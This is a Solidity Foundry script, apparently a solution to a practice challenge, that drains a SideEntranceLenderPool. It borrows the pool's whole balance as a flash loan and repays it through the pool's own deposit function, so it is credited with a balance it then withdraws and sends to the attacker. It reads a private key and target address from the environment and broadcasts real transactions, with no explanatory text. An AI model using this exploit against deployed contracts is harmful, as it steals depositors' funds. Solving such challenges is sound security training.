// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Script} from "forge-std/Script.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "./IFlashLoanEtherReceiver.sol";

contract AttackScript is Script, IFlashLoanEtherReceiver {
    SideEntranceLenderPool private sideEntrance;
    address private attacker;

    function setUp() public {
        attacker = vm.rememberKey(vm.envUint('PRIVATE_KEY'));
        sideEntrance = SideEntranceLenderPool(vm.envUint('CONTRACT'));
    }

    function run() external {
        vm.startBroadcast(attacker);

        sideEntrance.flashLoan(address(sideEntrance).balance);
        sideEntrance.withdraw();

        (bool success, ) = payable(attacker).call{value: address(this).balance}("");
        require(success, "send failed");

        vm.stopBroadcast();
    }

    function execute() external payable override {
        sideEntrance.deposit{value: msg.value}();
    }

    receive() external payable {}
}
